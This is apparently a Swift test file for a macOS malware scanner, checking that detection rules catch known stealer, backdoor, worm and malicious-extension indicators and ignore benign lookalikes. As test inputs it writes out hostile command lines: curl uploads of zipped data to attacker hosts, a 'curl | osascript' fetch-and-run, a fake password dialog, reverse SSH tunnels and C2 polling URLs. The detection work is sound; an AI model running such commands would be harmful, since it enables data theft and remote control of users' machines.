import Foundation
import Testing
@testable import BluehatCore

struct StarterRuleTests {
    let rulebook: Rulebook

    init() throws {
        let url = URL(fileURLWithPath: #filePath)
            .deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent().deletingLastPathComponent()
            .appending(components: "rules", "rules.json")
        rulebook = try Rulebook.decode(from: Data(contentsOf: url))
    }

    func matches(_ ruleID: String, _ text: String) throws -> Bool {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        return Scanner.matches(Scanner.regexes(rule.patterns), text)
    }

    @Test(arguments: [
        "curl --connect-timeout 120 --max-time 300 -X POST -F \"file=@/tmp/out.zip\" https://sivvino.example/contact",
        "ditto -c -k --sequesterRsrc /tmp/9556/ /tmp/out.zip",
        "osascript -e display dialog \"Application wants to install helper\" default answer \"\" with hidden answer",
        "curl -fsSL https://x.example/a.scpt | osascript",
        "curl -X POST -H uuid: 162302ce3e3c4678 -H user: maxbloomberg -H buildid: agov --data-binary @/tmp/out.zip http://79.137.192.4/p2p",
        "zip -r /tmp/shub_log.zip /tmp/shub_8f2a",
        "/tmp/.2835b1b5098587a9XXXXXX",
        "/private/tmp/.2835b1b5098587a9XXXXXX",
    ])
    func detectsStealerActivity(command: String) throws {
        #expect(try matches("process.stealer-activity", command))
    }

    @Test(arguments: [
        "curl -F file=@/Users/me/report.pdf https://upload.example",
        "ditto -c -k --sequesterRsrc --keepParent MyApp.app MyApp.zip",
        "osascript -e display dialog \"Done\"",
        "curl --data-binary @/tmp/payload.json http://localhost:8080/api",
        "/tmp/.2835b1b5098587a8abcdef",
        "/Users/me/.2835b1b5098587a9abcdef",
    ])
    func ignoresNormalCommands(command: String) throws {
        #expect(try !matches("process.stealer-activity", command))
    }

    @Test func detectsAmosBackdoorLoop() throws {
        #expect(try matches("process.stealer-backdoor", "/bin/bash /Users/alex/.agent"))
        #expect(try !matches("process.stealer-backdoor", "/Users/alex/.agentrc-loader"))
    }

    @Test(arguments: [
        "/bin/bash /Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate",
        "/bin/zsh /tmp/.c.sh",
        "curl -s http://45.146.130.131/api/v1/bot/repeat/alex",
        "curl -s http://45.146.130.131/v1/bot/joinsystem/",
        "/tmp/socks",
    ])
    func detectsShubAndOdysseyBackdoors(command: String) throws {
        #expect(try matches("process.stealer-backdoor", command))
    }

    @Test(arguments: [
        "/Users/alex/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake",
        "/tmp/socks5-proxy --port 1080",
        "ssh -D 1080 -S /tmp/socks host.example",
        "curl https://api.example.com/v1/bots/actions",
    ])
    func ignoresGoogleUpdaterAndProxies(command: String) throws {
        #expect(try !matches("process.stealer-backdoor", command))
    }

    @Test func detectsShubLaunchItemButNotGoogleUpdaters() throws {
        #expect(try matches("launch.shub-fake-google-updater", "/Users/alex/Library/Application Support/Google/GoogleUpdate.app/Contents/MacOS/GoogleUpdate"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/Google/GoogleSoftwareUpdate/GoogleSoftwareUpdate.bundle/Contents/Resources/GoogleSoftwareUpdateAgent.app/Contents/MacOS/GoogleSoftwareUpdateAgent -runMode ifneeded"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Library/Application Support/Google/GoogleUpdater/Current/GoogleUpdater.app/Contents/MacOS/GoogleUpdater --wake-all --system"))
        #expect(try !matches("launch.shub-fake-google-updater", "/Users/alex/Library/LaunchAgents/com.google.keystone.agent.plist"))
    }

    @Test(arguments: [
        ("extension.cyberhaven-campaign-2024-12", "nnpnnpemnckcfdebeekibpiijlicmpom"),
        ("extension.cyberhaven-campaign-2024-12-fixed", "pajkjnmeojmbapicmbpliphjmcekeaac"),
        ("extension.csp-stripping-2025-02", "gdocgbfmddcfnlnpmnghmjicjognhonm"),
        ("extension.reddirection-2025-07", "eokjikchkppnkdipbiggnmlkahcdkikp"),
        ("extension.shadypanda-2025-12", "mljmfnkjmcdmongjnnnbbnajjdbojoci"),
        ("extension.superior-2026-08", "kdenlnncndfnhkognokgfpabgkgehodd"),
        ("extension.cloudapi-stream-2026-04", "obifanppcpchlehkjipahhphbcbjekfa"),
    ])
    func flagsKnownBadExtensionsByIDOnly(ruleID: String, extensionID: String) throws {
        let rule = try #require(rulebook.rules.first { $0.id == ruleID })
        #expect((rule.patterns ?? []).allSatisfy { $0.range(of: #"^\^browser=\\S\{1,32\} id=[a-p]{32}\\s$"#, options: .regularExpression) != nil })
        #expect(try matches(ruleID, "browser=Chrome id=\(extensionID) name=Helper update=https://clients2.google.com/service/update2/crx permissions=storage"))
        #expect(try matches(ruleID, "browser=Edge id=\(extensionID) name=Helper update=none permissions="))
        #expect(try !matches(ruleID, "browser=Chrome id=abcdefghijklmnopabcdefghijklmnop name=\(extensionID) update=none permissions="))
        #expect(try !matches(ruleID, "browser=Chrome id=a\(extensionID) name=Helper update=none permissions="))
    }

    @Test func flagsOnlyExtensionsOutsideOfficialStores() throws {
        let store = "browser=Chrome id=a name=Grammar update=https://clients2.google.com/service/update2/crx permissions=storage"
        let edge = "browser=Edge id=b name=Notes update=https://edge.microsoft.com/extensionwebstorebase/v1/crx permissions="
        let mozilla = "browser=Firefox id=c name=Blocker update=addons.mozilla.org permissions=storage"
        #expect(try !matches("extension.sideloaded", store))
        #expect(try !matches("extension.sideloaded", edge))
        #expect(try !matches("extension.sideloaded", mozilla))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=d name=PDF update=https://evil.example/u.xml permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=e name=PDF update=none permissions="))
        #expect(try matches("extension.sideloaded", "browser=Chrome id=f name=x update=https://clients2.google.com/service/update2/crx update=https://evil.example/u.xml permissions="))
    }

    @Test func flagsCookieAccessOnAllSitesOnly() throws {
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,<all_urls>"))
        #expect(try matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=*://*/*,storage,cookies"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=cookies,https://mail.example/*"))
        #expect(try !matches("extension.cookie-access", "browser=Chrome id=a name=x update=none permissions=<all_urls>,storage"))
    }

    @Test func flagsDebuggerAndProxyPermissions() throws {
        #expect(try matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,debugger"))
        #expect(try matches("extension.debugger-proxy", "browser=Firefox id=a name=x update=none permissions=proxy,<all_urls>"))
        #expect(try !matches("extension.debugger-proxy", "browser=Chrome id=a name=x update=none permissions=storage,tabs"))
    }

    @Test func flagsSystemExtensionsOnlyFromUnlistedVendors() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "sysext.unknown-vendor" })
        let extensions = [
            (bundle: "io.tailscale.ipn.macsys.network-extension", team: Optional("W5364U7YZB"), detail: "Tailscale"),
            (bundle: "io.macfuse.filesystems.macfuse", team: String?.none, detail: "macFUSE"),
            (bundle: "com.example.filter", team: Optional("AB12CD34EF"), detail: "Unknown filter"),
            (bundle: "com.example.rootkit", team: String?.none, detail: "Unknown kext"),
        ]
        #expect(Scanner.systemExtensionFindings([rule], extensions: extensions).map(\.detail) == ["Unknown filter", "Unknown kext"])
    }

    @Test func flagsOnlyXProtectBelowTheMinimum() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "xprotect.outdated" })
        let minimum = try #require(rule.minimumVersion)
        #expect(Scanner.xprotectFindings([rule], version: minimum - 1).count == 1)
        #expect(Scanner.xprotectFindings([rule], version: minimum).isEmpty)
    }

    @Test func flagsOnlyAppsGatekeeperCallsUnnotarized() throws {
        let rule = try #require(rulebook.rules.first { $0.id == "app.unnotarized" })
        #expect(rule.check == .notarization)
        #expect(rule.severity == .low)
        var cache = NotarizationCache(fileURL: FileManager.default.temporaryDirectory.appending(path: "bluehat-notarization-\(UUID().uuidString).json"))
        let apps = [
            (path: "/Applications/Stats.app", team: "RP2S87B72W", cdhash: "373e7d3b", isNotarized: true),
            (path: "/Applications/Old.app", team: "AB12CD34EF", cdhash: "9a6e0b67", isNotarized: false),
        ]
        let result = Scanner.notarizationFindings([rule], apps: apps, cache: &cache) { _ in false }
        #expect(result.findings.map(\.detail) == ["Old.app · team AB12CD34EF · /Applications/Old.app"])
    }

    @Test func detectsAppleNamedLaunchItemsOutsideSystem() throws {
        #expect(try matches("launch.apple-impersonation", "/Users/alex/Library/LaunchAgents/com.apple.crashreporter.helper.plist"))
        #expect(try matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.apple.systemupdater.plist"))
        #expect(try !matches("launch.apple-impersonation", "/Library/LaunchDaemons/com.google.keystone.daemon.plist"))
    }

    @Test(arguments: [
        ("extension.firefox-wallet-impersonators-2026-10", "view-focus-bright@webtools.co"),
        ("extension.firefox-wallet-stealers-2026-08", "bliss-heaven@webbrol.com"),
        ("extension.crypto-trader-sessions-2026-09", "orbittracker@snapshot.xyz"),
        ("extension.crypto-trader-sessions-2026-09", "ingjjklimdeocggninaaapofondbeopd"),
    ])
    func flagsKnownBadAddOnsByIDOnly(ruleID: String, extensionID: String) throws {
        #expect(try matches(ruleID, "browser=Firefox id=\(extensionID) name=Wallet update=addons.mozilla.org permissions=storage"))
        #expect(try !matches(ruleID, "browser=Firefox id=other@example.com name=\(extensionID) update=addons.mozilla.org permissions=storage"))
        #expect(try !matches(ruleID, "browser=Firefox id=a\(extensionID) name=Wallet update=addons.mozilla.org permissions=storage"))
    }

    @Test(arguments: [
        "bun Math_Symbol.js",
        "bun /Users/alex/project/node_modules/keyv/Math_Symbol.js",
        "/tmp/bun-dl-FYwN4e/bun /Users/alex/project/node_modules/flat-cache/math_init.js",
        "bun /Users/alex/project/.claude/math_init.js",
        "/bin/bash /Users/alex/.local/bin/gh-token-monitor.sh",
    ])
    func detectsShaiHuludWormProcesses(command: String) throws {
        #expect(try matches("npm.mini-shai-hulud-process", command))
    }

    @Test(arguments: [
        "bun run math_init.js",
        "bun test src/lib/math_init.js",
        "bun run build",
        "node /Users/alex/project/node_modules/keyv/Math_Symbol.js",
        "vim /Users/alex/project/node_modules/keyv/math_init.js",
    ])
    func ignoresBunCommandsWithoutTheWormPayload(command: String) throws {
        #expect(try !matches("npm.mini-shai-hulud-process", command))
    }

    @Test func warnsBeforeRevokingAMonitoredToken() throws {
        for ruleID in ["npm.mini-shai-hulud-monitor", "npm.mini-shai-hulud-process", "npm.testmetest-worm"] {
            let rule = try #require(rulebook.rules.first { $0.id == ruleID })
            let remedy = try #require(rule.remedy)
            #expect(remedy.hasPrefix("Don't revoke any GitHub token yet"))
        }
    }

    @Test func detectsOnlyTheCursorExtensionKey() throws {
        let key = "AAAAC3NzaC1lZDI1NTE5AAAAIDdvylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P"
        #expect(try matches("ssh.claude-code-cursor-key", "ssh-ed25519 \(key) svc-telemetry"))
        #expect(try matches("ssh.claude-code-cursor-key", "ssh-ed25519 \(key) renamed"))
        #expect(try !matches("ssh.claude-code-cursor-key", "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB0vylCEJ/k2TpezcTfedrkHyFSK9IZ3vmP6vhY4Ss0P svc-telemetry"))
    }

    @Test func detectsOnlyTheCursorExtensionTunnel() throws {
        #expect(try matches("process.claude-code-cursor-tunnel", "ssh -N -R *:0:localhost:22 -o BatchMode=yes tunnel@203.0.113.5"))
        #expect(try matches("process.claude-code-cursor-tunnel", "autossh -M 0 -N -R *:0:localhost:22 tunnel@203.0.113.5"))
        #expect(try !matches("process.claude-code-cursor-tunnel", "ssh -N -R *:0:localhost:22 dev@example.com"))
        #expect(try !matches("process.claude-code-cursor-tunnel", "ssh -N -R 8080:localhost:3000 tunnel@example.com"))
    }

    @Test func detectsPamStealerShellHookOnly() throws {
        #expect(try matches("profile.pamstealer-repair", "# sysnotif-repair"))
        #expect(try matches("profile.pamstealer-repair", "\"$HOME/Library/Application Support/System/.repair-run\" >/dev/null 2>&1 &"))
        #expect(try !matches("profile.pamstealer-repair", "alias fix='./repair-run.sh'"))
        #expect(try !matches("profile.pamstealer-repair", "source ~/bin/.repair-run.sh"))
        #expect(try !matches("profile.pamstealer-repair", "# repair my prompt"))
    }

    @Test(arguments: [
        "/Users/alex/Library/Application Support/System/Finder.app/Contents/MacOS/r8afup9un0",
        "/Users/alex/Library/Application Support/com.apple.finder.core/Finder.app/Contents/MacOS/77617EA0",
        "/bin/zsh /Users/alex/Library/Application Support/System/.repair-run",
        "/tmp/System Settings /Users/alex/Library/Application Support/com.apple.finder.core/Finder.app",
        "/bin/bash /Users/alex/.task/tokenlinux.sh",
        "/Users/alex/.task/node-v20.11.1-darwin-x64/bin/node /Users/alex/.task/node-v20.11.1-darwin-x64/bin/parser.js",
        "Chromium --user-data-dir=/Users/alex/.local/share/.stream/profiles/default",
        "/Library/Caches/com.apple.act.mond http://203.0.113.5:8000",
    ])
    func detectsReportedBackdoorProcesses(command: String) throws {
        #expect(try matches("process.stealer-backdoor", command))
    }

    @Test(arguments: [
        "/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder",
        "/System/Applications/System Settings.app/Contents/MacOS/System Settings",
        "task list /Users/alex/.task/pending.data",
        "/Users/alex/.nvm/versions/node/v20.11.1/bin/node server.js",
        "/usr/libexec/iconservicesagent /Library/Caches/com.apple.iconservices.store",
    ])
    func ignoresProcessesLikeReportedBackdoors(command: String) throws {
        #expect(try !matches("process.stealer-backdoor", command))
    }

    @Test(arguments: [
        "/Users/alex/Library/com.apple.iTunesCloud/SystemUpdate --type=renderer",
        "/Users/alex/Library/com.apple.internal.ck/iSync --type=renderer",
        "/Users/alex/Library/com.apple.appleaccountd/loginwindow_._",
    ])
    func detectsTraderTraitorBackdoors(command: String) throws {
        #expect(try matches("process.tradertraitor-backdoor", command))
    }

    @Test(arguments: [
        "/System/Library/CoreServices/loginwindow.app/Contents/MacOS/loginwindow console",
        "/System/Library/PrivateFrameworks/iTunesCloud.framework/Support/itunescloudd",
        "/usr/libexec/cfprefsd --cache /Users/alex/Library/Caches/com.apple.iTunesCloud/SystemUpdate",
        "/usr/sbin/softwareupdated",
    ])
    func ignoresAppleProcessesLikeTraderTraitorBackdoors(command: String) throws {
        #expect(try !matches("process.tradertraitor-backdoor", command))
    }
}
